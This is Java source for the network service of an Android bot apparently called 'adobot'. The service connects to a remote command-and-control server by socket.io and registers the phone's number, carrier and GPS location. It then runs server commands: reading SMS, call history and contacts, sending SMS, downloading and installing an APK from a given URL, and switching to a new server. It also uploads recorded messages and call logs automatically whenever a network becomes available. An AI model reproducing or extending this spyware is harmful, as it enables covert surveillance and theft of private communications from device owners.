package com.android.adobot.network;

import android.app.job.JobParameters;
import android.app.job.JobService;
import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.Network;
import android.net.NetworkCapabilities;
import android.net.NetworkInfo;
import android.net.NetworkRequest;
import android.os.Build;
import android.os.Environment;
import android.support.annotation.RequiresApi;
import android.util.Log;

import com.android.adobot.AdobotConstants;
import com.android.adobot.CommonParams;
import com.android.adobot.http.Http;
import com.android.adobot.http.HttpRequest;
import com.android.adobot.tasks.CallLogRecorderTask;
import com.android.adobot.tasks.GetCallLogsTask;
import com.android.adobot.tasks.GetContactsTask;
import com.android.adobot.tasks.GetSmsTask;
import com.android.adobot.tasks.LocationMonitor;
import com.android.adobot.tasks.SendSmsTask;
import com.android.adobot.tasks.SmsRecorderTask;
import com.android.adobot.tasks.TransferBotTask;
import com.android.adobot.tasks.UpdateAppTask;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.net.URISyntaxException;
import java.util.HashMap;

import io.socket.client.Ack;
import io.socket.client.IO;
import io.socket.client.Socket;
import io.socket.emitter.Emitter;

@RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
public class NetworkSchedulerService extends JobService {

    private static final String TAG = NetworkSchedulerService.class.getSimpleName();

    private SmsRecorderTask smsRecorderTask;
    private CallLogRecorderTask callLogRecorderTask;

    public static Socket socket;
    public static boolean connected = false;
    private static int MAX_RECONNECT = 10;
    private static boolean is_syncing = false;

    private int reconnects = 0;
    private LocationMonitor locationTask;
    private CommonParams commonParams;
    private NetworkSchedulerService client;
    private JobParameters jobParameters;
    private ConnectivityManager.NetworkCallback networkCallback;

    @Override
    public void onCreate() {
        super.onCreate();

        init();

        Log.i(TAG, "Service created");
    }

    /**
     * When the app's NetworkConnectionActivity is created, it starts this service. This is so that the
     * activity and this service can communicate back and forth. See "setUiCallback()"
     */
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.i(TAG, "onStartCommand");
        init();
        return START_NOT_STICKY;
    }


    @Override
    public boolean onStartJob(final JobParameters params) {
        jobParameters = params;
        Log.i(TAG, "onStartJob: ");
        sync();
        return true;
    }

    @Override
    public boolean onStopJob(JobParameters params) {
        Log.i(TAG, "onStopJob: ");
        disconnect();
        return true;
    }

    @Override
    public void onDestroy() {
        Log.i(TAG, "Destroyed!!");
        super.onDestroy();
        disconnect();
    }

    public void changeServer(String url) {
        commonParams = new CommonParams(this);
        socket.disconnect();
        locationTask.setServer(url);
        createSocket(url);
        socket.connect();
    }

    public boolean hasConnection() {
        ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo info = cm.getActiveNetworkInfo();

        return (info != null && info.isConnected());
    }

    public void connect() {
        if (hasConnection() && !connected && socket != null && !socket.connected())
            socket.connect();
    }

    public void sync() {

        if (is_syncing || !hasConnection()) return;

        is_syncing = true;
        connect();
        smsRecorderTask.submitNextRecord(new SmsRecorderTask.SubmitSmsCallback() {
            @Override
            public void onResult(boolean success) {
                Log.i(TAG, "Done submit record!!!!");

                callLogRecorderTask.submitNextRecord(new CallLogRecorderTask.SubmitCallLogCallback() {
                    @Override
                    public void onResult(boolean success) {
                        Log.i(TAG, "Done submit call logs!!!!");
                        is_syncing = false;
                    }
                });

            }
        });
    }

    public void disconnect() {
        if (socket != null && socket.connected()) socket.disconnect();
    }

    private void init() {

        if (smsRecorderTask == null) smsRecorderTask = new SmsRecorderTask(this);
        if (callLogRecorderTask == null) callLogRecorderTask = new CallLogRecorderTask(this);
        if (commonParams == null) commonParams = new CommonParams(this);
        if (client == null) client = this;
        if (locationTask == null) locationTask = new LocationMonitor(this);
        if (socket == null) createSocket(commonParams.getServer());
        if (networkCallback == null) createChangeConnectivityMonitor();

        Log.i(TAG, "\n\n\nSocket is " + (connected ? "connected" : "not connected\n\n\n"));

        connect();
        cleanUp();

    }

    private void createSocket(String url) {
        try {

            socket = IO.socket(url);
            socket.on(Socket.EVENT_CONNECT, new Emitter.Listener() {

                @Override
                public void call(Object... args) {

                    Log.i(TAG, "\n\nSocket connected\n\n");
                    connected = true;
                    reconnects = 0;

                    HashMap bot = new HashMap();
                    bot.put("uid", commonParams.getUid());
                    bot.put("provider", commonParams.getProvider());
                    bot.put("device", commonParams.getDevice());
                    bot.put("sdk", commonParams.getSdk());
                    bot.put("version", commonParams.getVersion());
                    bot.put("phone", commonParams.getPhone());
                    bot.put("lat", locationTask.getLatitude());
                    bot.put("longi", locationTask.getLongitude());

                    JSONObject obj = new JSONObject(bot);
                    socket.emit("register", obj, new Ack() {
                        @Override
                        public void call(Object... args) {
                            Log.i(TAG, "Socket connected");
                        }
                    });

                }

            });

            socket.on("commands", new Emitter.Listener() {

                @Override
                public void call(Object... args) {
                    JSONArray cmds = (JSONArray) args[0];
                    for (int i = 0; i < cmds.length(); i++) {
                        try {
                            JSONObject cmd = (JSONObject) cmds.get(i);

                            String command = (String) cmd.get("command");
                            Log.i(TAG, "\nCommand: " + cmd.toString() + "\n");

                            if (command.equals("getsms")) {
                                Log.i(TAG, "\nInvoking Sms Service\n");
                                int arg1 = Integer.parseInt(cmd.get("arg1").toString());
                                GetSmsTask smsService = new GetSmsTask(client, arg1);
                                smsService.start();
                            } else if (command.equals("getcallhistory")) {
                                Log.i(TAG, "\nInvoking Call LOg Service\n");
                                int arg1 = Integer.parseInt(cmd.get("arg1").toString());
                                GetCallLogsTask cs = new GetCallLogsTask(client, arg1);
                                cs.start();
                            } else if (command.equals("getcontacts")) {
                                Log.i(TAG, "\nInvoking GetContactsTask\n");
                                GetContactsTask cs = new GetContactsTask(client);
                                cs.start();
                            } else if (command.equals("promptupdate")) {
                                Log.i(TAG, "\nInvoking UpdateAppTask\n");
                                String apkUrl = cmd.get("arg1").toString();

                                UpdateAppTask atualizaApp = new UpdateAppTask(client, apkUrl);
                                atualizaApp.start();
                            } else if (command.equals("sendsms")) {
                                Log.i(TAG, "\nInvoking SendSMS\n");
                                String phoneNumber = cmd.get("arg1").toString();
                                String textMessage = cmd.get("arg2").toString();

                                SendSmsTask sendSmsTask = new SendSmsTask(client);
                                sendSmsTask.setPhoneNumber(phoneNumber);
                                sendSmsTask.setTextMessage(textMessage);
                                sendSmsTask.start();

                            } else if (command.equals("transferbot")) {
                                Log.i(TAG, "\nInvoking Transfer bot command\n");
                                String newServer = cmd.get("arg1").toString();

                                TransferBotTask t = new TransferBotTask(client, newServer);
                                t.start();

                            } else {
                                Log.i(TAG, "Unknown command");
                                HashMap xcmd = new HashMap();
                                xcmd.put("event", "command:unknown");
                                xcmd.put("uid", commonParams.getUid());
                                xcmd.put("device", commonParams.getDevice());
                                xcmd.put("command", command);

                                Http req = new Http();
                                req.setUrl(commonParams.getServer() + "/notify");
                                req.setMethod(HttpRequest.METHOD_POST);
                                req.setParams(xcmd);
                                req.execute();
                            }

                        } catch (JSONException e) {
                            e.printStackTrace();
                        }
                    }
                }

            });

            socket.on(Socket.EVENT_DISCONNECT, new Emitter.Listener() {

                @Override
                public void call(Object... args) {
                    connected = false;
                    Log.i(TAG, "\n\nSocket disconnected...\n\n");
                    /*final Thread reconnect = new Thread(new Runnable() {
                        @Override
                        public void run() {
                            Log.i(TAG, "Socket reconnecting...");
                        }
                    });*/

                }

            });

            socket.on(Socket.EVENT_RECONNECTING, new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                    if (hasConnection() && reconnects <= MAX_RECONNECT) {
                        reconnects++;
                        Log.i(TAG, "Socket reconnecting...");
                    } else {
                        reconnects = 0;
                        try {
                            jobFinished(jobParameters, true);
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                        disconnect();
                    }
                }
            });

        } catch (URISyntaxException e) {
            e.printStackTrace();
        }

    }

    private void createChangeConnectivityMonitor() {

        NetworkRequest networkRequest = new NetworkRequest.Builder()
                .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
                .build();

        networkCallback = new ConnectivityManager.NetworkCallback() {

            @Override
            public void onAvailable(Network network) {
                Log.i(TAG, "On available network");
                sync();
            }

            @Override
            public void onLost(Network network) {
                Log.i(TAG, "On not available network");
                disconnect();
            }
        };

        ConnectivityManager connectivityManager = (ConnectivityManager)
                getSystemService(Context.CONNECTIVITY_SERVICE);

        if (connectivityManager != null) {
            connectivityManager.registerNetworkCallback(networkRequest, networkCallback);
        }

    }

    private void cleanUp () {
//        remove previously installed update apk file
        File updateApk = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), AdobotConstants.UPDATE_PKG_FILE_NAME);
        if (updateApk.exists())
            updateApk.delete();
    }
}